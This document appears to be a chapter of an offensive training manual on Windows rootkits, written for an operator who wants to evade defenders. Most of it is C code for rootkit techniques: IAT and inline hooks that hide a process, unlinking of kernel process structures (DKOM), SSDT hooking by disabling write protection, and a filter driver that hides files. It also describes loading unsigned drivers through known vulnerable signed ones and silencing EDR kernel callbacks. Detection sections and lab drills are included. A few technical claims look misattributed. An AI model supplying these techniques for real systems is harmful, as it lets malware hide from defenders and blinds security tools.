# Chapter 11 — Rootkits: User Mode & Kernel Rootkits

**VADER-RCE Field Manual**
**Prerequisite**: Ch10 (Code Injection), Ch08 (Target Reversing), basic Windows driver model
**Drill**: DRILLS/11_rootkits/

---

## Why You Need This

Persistence is nothing. Process injection is nothing. The SOC analyst
opens Process Explorer, sees your implant, kills it, you're burned.

A rootkit changes the rules. Not "hide from the analyst" — that's
fantasy. "Subvert the information the analyst receives." The analyst
is looking at a terminal. The terminal queries the OS. The OS is yours.
The terminal sees what you tell it to see.

User-mode rootkits hook the function calls between applications and
the OS. The application asks for a process list. Your hook intercepts
the answer and removes your process before returning. Crude, fast,
effective against unsophisticated tooling.

Kernel-mode rootkits operate below the OS. They modify kernel data
structures directly. They install their own drivers. They intercept
IRP (I/O Request Packets) — the fundamental message-passing mechanism
of the Windows kernel. At this level, the OS itself becomes your tool.

The difference matters operationally. User-mode hooks are trivially
bypassed by any tool that makes direct syscalls or reads kernel
structures directly. Kernel-mode techniques require the attacker to
operate at ring 0 — but once there, the visibility advantage is
categorical, not incremental.

Understand BOTH layers. Understand what defenders use to detect EACH.
Then you can make informed decisions about which level you need for
a given operation.

---

## Section 1 — User-Mode Rootkit: IAT Hooking

The Import Address Table is an array of function pointers maintained
by the Windows loader. When application code calls `GetProcessList`,
it doesn't call the function directly — it calls the address stored
in the IAT entry for that function. Overwrite that address, and every
call to `GetProcessList` from that process goes to YOUR function instead.

### How The IAT Works

```
PE file (application.exe):
    .idata section contains:
        Import Descriptor for KERNEL32.DLL:
            OriginalFirstThunk → array of function name hints
            FirstThunk → IAT (array of addresses, filled by loader)

At load time, Windows loader:
    For each entry in FirstThunk:
        → Resolves the function address in the target DLL
        → Writes that address into the FirstThunk array

Application code compiled as:
    call [__imp__GetProcAddress]   ; indirect call via IAT entry
```

### Performing IAT Hook

```c
#include <windows.h>

void iat_hook(const char *module_name, const char *func_name,
              PVOID hook_func, PVOID *original_func) {
    // Get base address of the module we're hooking in
    HMODULE base = GetModuleHandleA(NULL);  // current process main module

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);

    IMAGE_IMPORT_DESCRIPTOR *import_dir =
        (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)base
        + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // Walk import descriptors
    for (; import_dir->Name; import_dir++) {
        const char *dll_name = (const char*)((BYTE*)base + import_dir->Name);
        if (_stricmp(dll_name, module_name) != 0) continue;

        // Found the target DLL's import descriptor
        IMAGE_THUNK_DATA *thunk_orig = (IMAGE_THUNK_DATA*)((BYTE*)base
            + import_dir->OriginalFirstThunk);
        IMAGE_THUNK_DATA *thunk_iat  = (IMAGE_THUNK_DATA*)((BYTE*)base
            + import_dir->FirstThunk);

        for (; thunk_orig->u1.Ordinal; thunk_orig++, thunk_iat++) {
            if (IMAGE_SNAP_BY_ORDINAL(thunk_orig->u1.Ordinal)) continue;

            IMAGE_IMPORT_BY_NAME *iname =
                (IMAGE_IMPORT_BY_NAME*)((BYTE*)base
                + thunk_orig->u1.AddressOfData);

            if (strcmp((char*)iname->Name, func_name) != 0) continue;

            // Found the IAT entry
            *original_func = (PVOID)thunk_iat->u1.Function;

            // Remove write protection
            DWORD old_protect;
            VirtualProtect(&thunk_iat->u1.Function, sizeof(PVOID),
                           PAGE_READWRITE, &old_protect);

            // Overwrite with hook address
            thunk_iat->u1.Function = (ULONG_PTR)hook_func;

            // Restore protection
            VirtualProtect(&thunk_iat->u1.Function, sizeof(PVOID),
                           old_protect, &old_protect);
            return;
        }
    }
}

// Example hook: hide our process from EnumProcesses
typedef BOOL (WINAPI *pfnEnumProcesses)(DWORD*, DWORD, DWORD*);
pfnEnumProcesses orig_EnumProcesses = NULL;

BOOL WINAPI hook_EnumProcesses(DWORD *pids, DWORD cb, DWORD *bytes_returned) {
    BOOL result = orig_EnumProcesses(pids, cb, bytes_returned);
    if (!result) return result;

    DWORD our_pid = GetCurrentProcessId();
    DWORD count = *bytes_returned / sizeof(DWORD);

    // Remove our PID from the returned array
    for (DWORD i = 0; i < count; i++) {
        if (pids[i] == our_pid) {
            memmove(&pids[i], &pids[i+1], (count - i - 1) * sizeof(DWORD));
            *bytes_returned -= sizeof(DWORD);
            count--;
            break;
        }
    }
    return result;
}

// Install the hook
iat_hook("psapi.dll", "EnumProcesses",
         hook_EnumProcesses, (PVOID*)&orig_EnumProcesses);
```

### Limitations of IAT Hooking

```
IAT hooks only affect processes that import via the IAT.
Bypasses:
    GetProcAddress at runtime — no IAT entry, direct resolution
    Static linking — no import table entry at all
    Direct syscalls — bypasses all user-mode hooks entirely
    Tools that read NTDLL/KERNEL32 IAT in another process — your hook
        is only in your process, not in the tool inspecting your process

Scope: IAT hooking is INTRA-PROCESS. You hook the IAT of the process
you're running in. You don't hook the tool that's LOOKING at your process.
```

---

## Section 2 — User-Mode Rootkit: Inline Hooking (Trampoline)

IAT hooking is limited to processes that load via the IAT. Inline hooking
is more powerful: you patch the FUNCTION itself. Any caller, any process
that shares the same DLL mapping, gets the hook.

### The Trampoline Mechanism

```
BEFORE HOOK:
    kernel32!CreateProcessW:
        48 89 5C 24 08    mov [rsp+8], rbx
        48 89 74 24 10    mov [rsp+10], rsi
        57                push rdi
        41 54             push r12
        ...

AFTER HOOK (5-byte near jump injected at start):
    kernel32!CreateProcessW:
        E9 XX XX XX XX    jmp hook_CreateProcessW    ← your code
        XX XX XX XX       (original bytes overwritten)
        57                push rdi                   ← execution resumes here
        41 54             push r12                      after trampoline
        ...

TRAMPOLINE (allocated stub):
    48 89 5C 24 08    (original first 5 bytes, copied here)
    48 89 74 24 10    (original next 5 bytes, copied here)
    E9 XX XX XX XX    jmp (CreateProcessW + 10)      ← jump back into original
```

### Implementation

```c
#include <windows.h>

typedef struct {
    PVOID  original_func;
    PVOID  hook_func;
    BYTE   original_bytes[16];
    BYTE   trampoline[32];
} HOOK;

int install_inline_hook(PVOID target, PVOID hook, HOOK *h) {
    h->original_func = target;
    h->hook_func     = hook;

    // Save original bytes
    memcpy(h->original_bytes, target, 16);

    // Build trampoline:
    // Copy first 5 bytes of original (they'll be overwritten)
    // Then write a jmp back to original+5
    BYTE *tramp = h->trampoline;

    // Disassemble to find how many bytes we need (at least 5, must be
    // on instruction boundary) — simplified: use 14-byte absolute jmp
    // for x64 instead of 5-byte near jmp to avoid ±2GB range limit

    // x64 absolute indirect jmp:
    //   FF 25 00 00 00 00   jmp [rip+0]
    //   XX XX XX XX XX XX XX XX   <64-bit address>
    // Total: 14 bytes

    // Copy original bytes to trampoline
    memcpy(tramp, target, 14);

    // Append jmp back to original+14
    BYTE *jmp_back = tramp + 14;
    *(WORD*)jmp_back = 0x25FF;               // JMP [RIP+0]
    *(DWORD*)(jmp_back + 2) = 0;             // RIP+0 offset
    *(PVOID*)(jmp_back + 6) = (PBYTE)target + 14;  // absolute target

    // Make trampoline executable
    DWORD old;
    VirtualProtect(h->trampoline, 32, PAGE_EXECUTE_READWRITE, &old);

    // Patch target function with jmp to hook
    DWORD old2;
    VirtualProtect(target, 14, PAGE_EXECUTE_READWRITE, &old2);

    PBYTE patch = (PBYTE)target;
    *(WORD*)patch = 0x25FF;                  // JMP [RIP+0]
    *(DWORD*)(patch + 2) = 0;               // RIP+0 offset
    *(PVOID*)(patch + 6) = hook;            // absolute hook address

    VirtualProtect(target, 14, old2, &old2);

    return 0;
}
```

### Trampoline Pattern Summary

```
PATCHED FUNCTION            TRAMPOLINE BUFFER           YOUR HOOK
────────────────            ─────────────────           ──────────
jmp [rip+0] ──────────────►  do custom logic ◄──────── entry point
<addr: hook>                  call original              (filter args,
                              (via trampoline)            hide entries,
                              ret                         log calls, etc.)
                                  │
                                  ▼
                              original bytes
                              jmp original+14
                                  │
                                  ▼
                              real function
                              continues normally
```

---

## Section 3 — User-Mode Rootkit: DLL Injection as Persistence

User-mode rootkit hooks require code running inside the target process.
You need a persistence mechanism to keep your hook DLL loaded across
process restarts and new process creation.

### AppInit_DLLs

```
Registry key: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
Value: AppInit_DLLs = C:\Windows\Temp\hook.dll
Value: LoadAppInit_DLLs = 1

Effect: every process that loads USER32.dll also loads your DLL.
That's nearly every GUI application.

Detection: trivially visible in registry, well-known persistence key,
checked by every security tool ever written.
```

### Windows Hook (SetWindowsHookEx)

```c
// Install a system-wide keyboard hook
// Windows will inject your DLL into EVERY process that processes keystrokes
HMODULE h_dll = LoadLibraryA("hook.dll");
HOOKPROC hook_proc = (HOOKPROC)GetProcAddress(h_dll, "KeyboardProc");
HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, h_dll, 0);

// 0 as thread ID = global hook — all threads in all processes
// Your DLL gets injected into every process in the session
```

SetWindowsHookEx legitimately injects DLLs as part of normal Windows
functionality. It's visible but the mechanism itself is not suspicious.
You're abusing a feature, not exploiting a vulnerability.

---

## Section 4 — Kernel-Mode Rootkits: DKOM (Direct Kernel Object Manipulation)

This is where user-mode tools stop working. When an analyst runs
Process Explorer, it doesn't ask the user-mode process list API —
it reads kernel memory directly. To hide from that, you need to
modify kernel memory directly.

DKOM is the oldest and most fundamental kernel rootkit technique.
Specifically: process hiding by unlinking the EPROCESS structure
from the doubly-linked list that the kernel uses to track processes.

### The EPROCESS Structure

Every running process has a kernel object: EPROCESS. These objects
are chained together in a doubly-linked list via the `ActiveProcessLinks`
field. NtQuerySystemInformation (the kernel function behind
`EnumProcesses`) walks this list to return the process list.

```
EPROCESS (System) ──► EPROCESS (svchost.exe) ──► EPROCESS (your.exe) ──► EPROCESS (explorer.exe)
         ◄────────────────────────────────────────────────────────────────
         (doubly linked — LIST_ENTRY with Flink + Blink)

If you unlink EPROCESS(your.exe):
    EPROCESS (System) ──► EPROCESS (svchost.exe) ──► EPROCESS (explorer.exe)
                                                   ◄──
    your.exe still runs — threads still scheduled — just invisible to the list walker
```

### DKOM Implementation (Concept)

```c
// Run in kernel mode (requires a driver)
// Target: hide the process with a given PID

VOID HideProcess(ULONG target_pid) {
    PEPROCESS target_process;

    // PsLookupProcessByProcessId — get EPROCESS pointer by PID
    if (!NT_SUCCESS(PsLookupProcessByProcessId(
            (HANDLE)(ULONG_PTR)target_pid, &target_process))) {
        return;
    }

    // Get the ActiveProcessLinks offset
    // This offset varies by Windows version — must be determined per-version
    // On Windows 10 21H2 x64: ActiveProcessLinks is at EPROCESS+0x448
    PLIST_ENTRY process_links = (PLIST_ENTRY)(
        (PUCHAR)target_process + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET
    );

    // Unlink from the list
    PLIST_ENTRY prev = process_links->Blink;
    PLIST_ENTRY next = process_links->Flink;

    prev->Flink = next;  // bypass our node going forward
    next->Blink = prev;  // bypass our node going backward

    // Null our own links to prevent crash if someone walks to us
    process_links->Flink = process_links;
    process_links->Blink = process_links;

    ObDereferenceObject(target_process);
}
```

### Finding EPROCESS Offsets

```
Offsets change between Windows versions. Three methods:

Method 1: Hardcoded per-version table
    typedef struct {
        ULONG build;
        ULONG active_process_links;
        ULONG pid_offset;
        ULONG token_offset;
    } EPROCESS_OFFSETS;

    EPROCESS_OFFSETS offsets_table[] = {
        { 19041, 0x448, 0x440, 0x4B8 },  // Win10 2004
        { 19042, 0x448, 0x440, 0x4B8 },  // Win10 20H2
        { 22621, 0x448, 0x440, 0x4B8 },  // Win11 22H2
        // ... add new builds as they release
    };

Method 2: PsInitialSystemProcess walk
    // PsInitialSystemProcess is an exported kernel variable
    // Walk from System (PID 4) forward, find our target by PID field
    // This works regardless of offset knowledge if you know the PID offset

Method 3: KdVersionBlock / kernel symbols
    // Load kernel PDB symbols
    // Look up EPROCESS!ActiveProcessLinks offset
    // Requires internet access or pre-loaded symbols
    dt nt!_EPROCESS -r    ← in WinDbg, shows all offsets
```

---

## Section 5 — SSDT Hooks

The System Service Descriptor Table. In x64 Windows, the SSDT maps
syscall numbers to their kernel function implementations. NtQuerySystemInformation
is syscall 0x36. The SSDT says: syscall 0x36 → call this function at this address.

Hooking the SSDT means: replace that address with your own. All calls
to NtQuerySystemInformation from all processes in the system go through
your hook.

### The SSDT Structure

```
nt!KiServiceTable:
    LONG offsets[n];   // relative offsets, not absolute addresses
                       // actual address = KiServiceTable + (entry >> 4)
                       // (the lower 4 bits encode the argument count)

Syscall 0x36 (NtQuerySystemInformation):
    KiServiceTable[0x36] = offset to nt!NtQuerySystemInformation
                           × 16 + arg_count
```

### SSDT Hook (Conceptual — Requires Kernel Mode)

```c
// Get SSDT address
// KeServiceDescriptorTable is not exported in x64 Windows
// Must find it via:
//   1. Pattern scan in ntoskrnl.exe (look for KiSystemCall64 and trace to table)
//   2. Or use undocumented KeServiceDescriptorTable via reverse engineering

PLONG ssdt = GetKiServiceTableAddress(); // your implementation

// Get current offset for syscall 0x36
LONG original_offset = ssdt[0x36];

// Calculate original function address
PVOID original_func = (PVOID)(
    (ULONG_PTR)ssdt + (original_offset >> 4)
);

// Build your hook function
NTSTATUS NTAPI hook_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS info_class,
    PVOID info, ULONG info_len, PULONG return_len
) {
    NTSTATUS status = original_func(info_class, info, info_len, return_len);

    if (info_class == SystemProcessInformation && NT_SUCCESS(status)) {
        // Walk SYSTEM_PROCESS_INFORMATION linked list
        // Remove our process's entry
        filter_process_list(info, GetCurrentProcessId());
    }
    return status;
}

// Patch the SSDT entry
// Must disable write protection on SSDT memory:
//   CR0 bit 16 (Write Protect) — clear it to write to read-only pages
ULONG_PTR cr0 = __readcr0();
__writecr0(cr0 & ~0x10000);  // clear WP bit

// Calculate new offset (hook_func relative to ssdt base, shifted)
LONG new_offset = (LONG)(
    ((ULONG_PTR)hook_NtQuerySystemInformation - (ULONG_PTR)ssdt) << 4
    | arg_count
);
ssdt[0x36] = new_offset;

__writecr0(cr0);  // restore WP bit
```

### Why SSDT Hooks Are Mostly Dead

```
PatchGuard (Kernel Patch Protection):
    Introduced with x64 Windows Vista.
    A background thread periodically verifies:
        — SSDT integrity
        — SSDT extension tables
        — Kernel code integrity (ntoskrnl.exe .text section)
        — EPROCESS.ActiveProcessLinks integrity (indirectly)
        — IDT (Interrupt Descriptor Table)
        — GDT (Global Descriptor Table)

    If tampering detected: BSOD with CRITICAL_STRUCTURE_CORRUPTION (0x109)
    The check interval is random (minutes to hours).
    The check runs in a TPM-verified secure region on modern Windows.

Practical result:
    SSDT hooks on x64 Windows 10/11 will eventually trigger PatchGuard.
    Not if, when.
    Timeline: minutes to hours depending on randomised check timing.
    Therefore: SSDT hooks are not viable for stable, long-term rootkits
    on x64 Windows. They WORK — until PatchGuard kills the system.

Bypass approaches (academic, most are patched):
    Hypervisor-based evasion: intercept PatchGuard's own reads
    PatchGuard disable via timing attack (historical, patched)
    Load before PatchGuard initialises (bootkit territory)
```

---

## Section 6 — Filter Driver Basics

A filter driver sits above (or below) an existing driver in a device
stack. I/O requests flow down the stack as IRPs (I/O Request Packets).
Your filter intercepts them, modifies them, and either passes them down
or completes them itself.

### The Device Stack Model

```
APPLICATION
    │ ReadFile("C:\Windows\System32\ntdll.dll")
    ▼
I/O Manager
    │ Creates IRP_MJ_READ
    ▼
Upper Filter Driver (your filter — optional)
    │ Intercept, modify, or block IRP
    ▼
File System Driver (ntfs.sys)
    │ Process the actual read
    ▼
Lower Filter Driver (optional)
    │
    ▼
Volume Driver / Storage Driver
    │
    ▼
Hardware
```

A file system mini-filter (using Filter Manager / fltmgr.sys) is the
modern approach. You register callbacks for specific IRP types and
specific file paths or extensions.

### Mini-Filter Registration

```c
#include <fltKernel.h>

PFLT_FILTER filter_handle;

// Pre-operation callback: called BEFORE the IRP reaches the FS driver
FLT_PREOP_CALLBACK_STATUS PreReadCallback(
    PFLT_CALLBACK_DATA Data,
    PCFLT_RELATED_OBJECTS FltObjects,
    PVOID *CompletionContext
) {
    // Check if this is a read of our hidden file
    PUNICODE_STRING file_name = &FltObjects->FileObject->FileName;

    if (RtlEqualUnicodeString(file_name, &HIDDEN_FILE, TRUE)) {
        // Complete the IRP with STATUS_OBJECT_NAME_NOT_FOUND
        // Caller gets "file not found" — file is invisible
        Data->IoStatus.Status = STATUS_OBJECT_NAME_NOT_FOUND;
        return FLT_PREOP_COMPLETE;  // don't pass to FS driver
    }

    return FLT_PREOP_SUCCESS_WITH_CALLBACK;  // pass through
}

FLT_OPERATION_REGISTRATION callbacks[] = {
    { IRP_MJ_READ, 0, PreReadCallback, NULL },
    { IRP_MJ_DIRECTORY_CONTROL, 0, PreDirCallback, NULL },
    { IRP_MJ_OPERATION_END }
};

FLT_REGISTRATION filter_registration = {
    sizeof(FLT_REGISTRATION),
    FLT_REGISTRATION_VERSION,
    0,
    NULL,
    callbacks,
    FilterUnloadCallback,
    InstanceSetupCallback,
    NULL, NULL, NULL, NULL, NULL, NULL
};

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    FltRegisterFilter(DriverObject, &filter_registration, &filter_handle);
    FltStartFiltering(filter_handle);
    return STATUS_SUCCESS;
}
```

A filter driver hiding files intercepts IRP_MJ_DIRECTORY_CONTROL
(directory enumeration) and IRP_MJ_CREATE (file open attempts) —
removing hidden file entries from directory responses and returning
NOT_FOUND for direct access attempts.

---

## Section 7 — IRP Hooking

Before Filter Manager existed (Windows XP era), rootkits hooked
the IRP dispatch tables directly. The concept is still relevant for
understanding the kernel I/O model.

Every driver object has a dispatch table: an array of function pointers,
one per major function code (IRP_MJ_READ, IRP_MJ_WRITE, etc.). Overwriting
an entry redirects all IRPs of that type for that device.

```c
// Target driver's dispatch table entry for IRP_MJ_READ
PDRIVER_OBJECT ntfs_driver_obj;  // obtained via IoGetDriverObjectPointer

// Save original handler
PDRIVER_DISPATCH orig_read = ntfs_driver_obj->MajorFunction[IRP_MJ_READ];

// Install hook
ntfs_driver_obj->MajorFunction[IRP_MJ_READ] = hook_read;

// Hook function
NTSTATUS hook_read(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    // Inspect file name, modify data, etc.
    // ...

    // Pass to original handler
    return orig_read(DeviceObject, Irp);
}
```

PatchGuard also monitors dispatch table integrity on critical drivers.
Same caveat as SSDT: eventually triggers BSOD.

---

## Section 8 — Bootkit Concept

A bootkit infects the boot process itself. Before the OS kernel loads,
your code runs and patches the kernel in memory. By the time the OS
starts, it's already compromised. PatchGuard loads into a kernel that
already has your modifications — it protects a system that is already
rooted.

```
BOOT SEQUENCE:
    UEFI firmware
        │
        ▼
    UEFI bootloader (bootmgfw.efi)   ← bootkit infection point 1
        │
        ▼
    Windows Boot Manager             ← bootkit infection point 2
        │
        ▼
    winload.exe                      ← bootkit infection point 3
        │
        ▼
    ntoskrnl.exe (kernel)            ← if not yet hooked, inject here
        │
        ▼
    SYSTEM process, PatchGuard       ← PatchGuard starts in a kernel
                                         that's already been modified
```

### Notable Bootkit Families

```
Bootkit/MBR:           Infects the Master Boot Record
    — Historical (pre-UEFI / pre-Secure Boot)
    — Dead on modern hardware with Secure Boot enabled

UEFI bootkit:          Infects the UEFI firmware or replaces bootmgfw.efi
    — FinFisher UEFI implant (2021 ESET research)
    — CosmicStrand (Kaspersky, 2022) — embedded in UEFI firmware
    — BlackLotus (ESET, 2023) — CVE-2022-21894 Secure Boot bypass
    — REQUIRES defeating Secure Boot or a firmware vulnerability

Secure Boot bypass:    Signed but vulnerable EFI binaries
    — CVE-2022-21894: Windows Boot Application signed SHIM
    — Loads unsigned bootkit before Secure Boot policy enforced
    — Patched, but bootkit installations persist on infected machines
```

A working bootkit in 2024+ requires:
- A Secure Boot bypass OR compromised signing cert OR physical access
- UEFI firmware knowledge
- Significant operational complexity

High reward (survives reimaging, defeats all OS-level defenses), high cost.

---

## Section 9 — Hypervisor Rootkit Concept

Move below the kernel. Insert a hypervisor between the hardware and
the OS. The OS runs as a VM. The hypervisor intercepts any operation
the OS attempts — memory access, I/O, MSR reads, everything.

```
NORMAL SYSTEM:
    Hardware
        │
    Windows (ring 0 = kernel)
        │
    Applications (ring 3 = user)

HYPERVISOR ROOTKIT:
    Hardware
        │
    Hypervisor (VMX root mode — ring -1, "ring -1")
        │
    Windows (now a VM — ring 0 relative to VM but not physical ring 0)
        │
    Applications
```

The hypervisor can intercept and modify EVERYTHING the OS reads from
hardware, including PatchGuard's integrity checks. PatchGuard reads
memory to verify it hasn't been modified — the hypervisor intercepts
that memory read and returns the "clean" original values.

### Blue Pill / BlueSpy Concept

```
1. Existing kernel-mode code (driver) calls VMXON
   — Takes physical control of CPU virtualisation extensions
   — "Sucks" the running OS into a VM silently

2. All future CPU operations by the OS go through VMCS (VM Control Structure)
   — Hypervisor gets notified on MSR accesses, I/O port accesses,
     memory accesses to specified regions (EPT violations)

3. EPT (Extended Page Tables) lets the hypervisor maintain a shadow
   memory view for the VM:
   — OS reads address X → hypervisor shows "clean" version
   — Actual physical address X has the modified (hooked) version
   — PatchGuard integrity check reads clean values → no BSOD
   — CPU actually executes modified values → hooks active
```

VirtioCore, HyperDbg, and hvpp demonstrate these concepts in public
research. Full implementation requires deep Intel VMX/AMD SVM knowledge.
Treat this as a threat model entry, not a weekend project.

---

## Section 10 — Detection: PatchGuard

PatchGuard's defence applies to x64 kernel only. Protections:

```
PROTECTED STRUCTURES:
    SSDT (KiServiceTable)
    Interrupt Descriptor Table (IDT)
    Global Descriptor Table (GDT)
    Critical kernel code (.text section of ntoskrnl, hal.dll, win32k.sys)
    EPROCESS fields (specific critical offsets, not all)
    Kernel object dispatch tables for core drivers

DETECTION METHOD:
    Encrypted, randomised timer — fires every N minutes (N = random, ~5-30 min)
    Runs in a code region that's obfuscated to defeat signature matching
    Compares current state of protected structures against stored checksums
    If mismatch: triggers BSOD 0x109 (CRITICAL_STRUCTURE_CORRUPTION)

WHAT IT DOESN'T PROTECT:
    Driver dispatch tables for non-core drivers
    User-mode memory (it's a kernel mechanism, doesn't watch ring 3)
    DKOM (the ActiveProcessLinks field — PatchGuard does NOT verify
          the linked list integrity of all EPROCESS objects)
    New memory regions you create (your driver's code, your hooks
          if they're in regions not being watched)

KEY POINT ON DKOM:
    Unlinking EPROCESS from ActiveProcessLinks is NOT directly caught
    by PatchGuard. PatchGuard verifies CODE regions. ActiveProcessLinks
    is data. You can unlink safely from PatchGuard's perspective.
    You can still be caught by OTHER mechanisms (see below).
```

---

## Section 11 — Detection: DSE (Driver Signature Enforcement)

To load a kernel driver on x64 Windows 10/11:

```
Requirements:
    Driver must be signed with:
    — Extended Validation (EV) certificate
    — OR Microsoft WHQL signature
    — OR test signing enabled (TESTSIGNING=ON boot option — obvious, logged)
    — OR DSE bypass technique

DSE bypass techniques:
    CI!g_CiEnabled patch (historical) — set code integrity flag to 0
        → Caught by PatchGuard (code integrity structures are watched)

    CVE-2022-21882 / BYOVD (Bring Your Own Vulnerable Driver):
        — Load a signed but vulnerable DRIVER
        — Exploit the driver from ring 3 to get kernel write primitive
        — Use kernel write to patch CI.dll in memory (DSE disable)
        — Load your unsigned driver
        — Restore CI.dll
        → Only the vulnerable driver needs a valid signature
        → Your rootkit driver is never submitted to MS for signing

    Notable BYOVD drivers:
        gdrv.sys (Gigabyte)     — arbitrary kernel read/write
        rtcore64.sys (ASUS)     — arbitrary kernel read/write
        DBUtil_2_3.sys (Dell)   — privilege escalation + kernel write
        mhyprot2.sys (miHoYo)   — arbitrary kernel read/write
```

---

## Section 12 — Detection: Kernel Callback Enumeration

Modern EDRs and security tools register kernel callbacks — legitimate
mechanisms to be notified of process creation, thread creation, image
loads, registry operations. Your rootkit competes against these for
early notification.

```
REGISTERED CALLBACK TYPES:
    PsSetCreateProcessNotifyRoutine    — fires on every process create/terminate
    PsSetCreateThreadNotifyRoutine     — fires on every thread create/terminate
    PsSetLoadImageNotifyRoutine        — fires when a PE is loaded (including DLLs)
    CmRegisterCallback                 — fires on registry operations
    ObRegisterCallbacks                — fires on object handle operations

TOOLS TO ENUMERATE REGISTERED CALLBACKS:
    WinDbg: dq nt!PspCreateProcessNotifyRoutine L20
    ARKitLib, kernel-callback-enum, DriverQuery
    PCHunter (user-mode tool that reads kernel directly)

ROOTKIT RESPONSE TO CALLBACKS:
    1. Enumerate callbacks → find the EDR's registered routine addresses
    2. Zero out the array entries → EDR no longer receives notifications
       (requires kernel write primitive)
    3. Or: overwrite the function pointer with a stub that returns success
       without doing anything

DETECTION OF CALLBACK MANIPULATION:
    EDR's callback not being called for a known event
    Callback array has nulls where populated entries were
    Count of registered callbacks drops unexpectedly
    Memory forensics: callback array history via snapshot comparison
```

---

## Section 13 — How Volatility Detects Rootkits

Volatility is a memory forensics framework. It analyzes raw memory images.
A live EDR can be blinded by your hooks. A memory image taken from
outside the OS cannot be blinded by user-mode or kernel-mode hooks —
it's raw bytes, read directly by a separate tool.

### pslist vs psscan Discrepancy

```
Volatility pslist:
    Walks EPROCESS ActiveProcessLinks — same list the kernel uses
    A DKOM-hidden process has been unlinked from this list
    pslist will NOT show the hidden process

Volatility psscan:
    Pool tag scan: searches raw memory for the EPROCESS pool allocation tag
    Windows kernel marks every EPROCESS allocation with tag 'Proc'
    Pool tag search finds EPROCESS objects even if they're not in the list
    psscan WILL show the hidden process

Discrepancy:
    pslist says: System, svchost, explorer, chrome
    psscan says: System, svchost, explorer, chrome, YOUR_IMPLANT.exe

    Any process that appears in psscan but NOT pslist is a smoking gun.
    DKOM is immediately visible to memory forensics.
```

### malfind

```
Volatility malfind:
    Searches process memory for regions that are:
    — Executable
    — Not backed by a file on disk (private committed memory)
    — Contain MZ/PE header signatures

    Output: suspected injected code regions, shown with hex dump
    and disassembly of first few instructions

    CATCHES:
        — Reflective DLL injection (PE in heap, no file backing)
        — Shellcode injection (executable private memory)
        — Process hollowing (PE headers don't match file on disk)

    DOES NOT CATCH:
        — Injected code that has had its PE headers wiped
          (stomp the MZ + PE headers after loading — malfind won't see the sig)
        — Injected code that's been marked non-executable after execution
          (execute, then flip back to RW — but timing is hard)
```

### Other Volatility Plugins

```
volatility -f memory.img windows.dlllist    — module list per process
    Compare against baseline. Extra modules = injected DLLs.

volatility -f memory.img windows.handles   — all handle objects
    Orphan handles to deleted processes may indicate rootkit remnants.

volatility -f memory.img windows.ssdt      — SSDT function addresses
    Compare against known-good values from a clean system image.
    Modified entries = SSDT hook.

volatility -f memory.img windows.callbacks — kernel callback table
    List all registered PsSetCreateProcessNotifyRoutine entries etc.
    Unknown callback addresses = rootkit.

volatility -f memory.img windows.driverirp — IRP dispatch tables
    Compare driver major function pointers against module ranges.
    Pointer outside any loaded driver = IRP hook.
```

---

## Key Terms

| Term | Definition |
|------|-----------|
| **IAT hooking** | Overwriting Import Address Table function pointers to redirect calls to a hook function |
| **Inline hook** | Patching the first bytes of a function with a jump to a hook function |
| **Trampoline** | Stub code that executes the original bytes displaced by a hook, then jumps back into the original function |
| **EPROCESS** | Kernel data structure representing a process; contains all process metadata including the ActiveProcessLinks list entry |
| **DKOM** | Direct Kernel Object Manipulation — modifying kernel data structures to hide information (e.g., unlinking EPROCESS from the active process list) |
| **SSDT** | System Service Descriptor Table — maps syscall numbers to kernel function addresses; hooking it intercepts all syscalls of a given type |
| **PatchGuard (KPP)** | Kernel Patch Protection — periodically verifies integrity of protected kernel structures; triggers BSOD on tampering |
| **IRP** | I/O Request Packet — the fundamental message-passing structure for kernel I/O; filter drivers intercept IRPs |
| **Filter driver** | Driver that sits in a device stack above or below another driver, intercepting IRPs passing through |
| **Mini-filter** | Modern filter driver model using Filter Manager (fltmgr.sys); preferred over legacy filter drivers |
| **DSE** | Driver Signature Enforcement — kernel policy requiring drivers to be signed with a valid certificate |
| **BYOVD** | Bring Your Own Vulnerable Driver — loading a legitimately signed but vulnerable driver to gain kernel write access |
| **Bootkit** | Malware infecting the boot chain before the OS loads; can defeat OS-level defenses including PatchGuard |
| **Hypervisor rootkit** | Malware that inserts itself below the OS as a hypervisor; runs at VMX root mode (ring -1) |
| **EPT** | Extended Page Tables — hardware-assisted memory virtualisation; allows hypervisor to maintain shadow memory views |
| **pslist vs psscan** | Volatility comparison: pslist walks the linked list (DKOM-bypassable), psscan finds pool tags in raw memory (DKOM-resistant) |
| **malfind** | Volatility plugin that finds executable private memory containing PE signatures — primary tool for detecting code injection |
| **Kernel callbacks** | Registered notification routines called by the kernel on process/thread/image events; EDRs use these for early visibility |

---

## Drill 11 — Rootkits

Go to `DRILLS/11_rootkits/`. A driver development environment and test VM
are configured with TESTSIGNING=ON and kernel debugging enabled.

Your missions:

1. **IAT hook**: In the provided test harness, hook `EnumProcesses` via IAT.
   Hide the harness's own PID from the returned list. Verify with a second
   tool that calls `EnumProcesses` — it should not show your process.

2. **Inline hook**: Hook `CreateFileW` via inline/trampoline method. Log
   all file path arguments to a buffer. Verify the original function still
   works (files open normally). Read the log buffer to confirm interception.

3. **DKOM**: Load the provided test driver. Use it to unlink the test
   process EPROCESS from `ActiveProcessLinks`. Verify:
   - `tasklist` does NOT show the process
   - `psscan` via WinDbg `!process 0 0` comparison DOES show it
   - Process is still running (it continues printing to its window)

4. **Volatility analysis**: Take a memory image of the test VM after step 3.
   Run `windows.pslist` and `windows.psscan`. Document the discrepancy.
   Run `windows.malfind` against the injected process from Drill 10 image.
   Document what it finds.

5. **Callback enumeration**: Use WinDbg `dq nt!PspCreateProcessNotifyRoutine L20`
   to list all registered process creation callbacks. Identify which
   belong to EDR-like components vs native OS. Document each entry.

The goal of step 4-5 is to train DETECTION awareness alongside technique
